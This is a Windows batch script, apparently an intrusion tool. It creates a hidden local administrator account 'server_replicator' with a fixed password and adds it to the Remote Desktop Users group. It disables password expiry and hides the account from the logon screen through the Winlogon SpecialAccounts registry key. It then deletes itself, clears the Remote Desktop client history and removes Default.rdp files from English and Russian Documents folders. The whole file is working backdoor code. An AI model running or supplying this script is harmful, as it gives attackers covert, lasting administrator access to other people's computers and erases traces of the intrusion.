Set AdmGroupSID=S-1-5-32-544
Set AdmGroup=
For /F "UseBackQ Tokens=1* Delims==" %%I In (`WMIC Group Where "SID = '%AdmGroupSID%'" Get Name /Value ^| Find "="`) Do Set AdmGroup=%%J
Set AdmGroup=%AdmGroup:~0,-1%
net user server_replicator Admin@123467 /add
net localgroup %AdmGroup% server_replicator /add
Set RDPGroupSID=S-1-5-32-555
Set RDPGroup=
For /F "UseBackQ Tokens=1* Delims==" %%I In (`WMIC Group Where "SID = '%RDPGroupSID%'" Get Name /Value ^| Find "="`) Do Set RDPGroup=%%J
Set RDPGroup=%RDPGroup:~0,-1%
net localgroup "%RDPGroup%" server_replicator /add
net accounts /maxpwage:unlimited
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v server_replicator /t REG_DWORD /d 0 /f
pause
del %0
ping 127.0.0.1 -n 30
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client" /f
cd %userprofile%\My documents\
attrib Default.rdp -s -h
del Default.rdp
cd %userprofile%\Мои документы\
attrib Default.rdp -s -h
del Default.rdp
del "%~f0"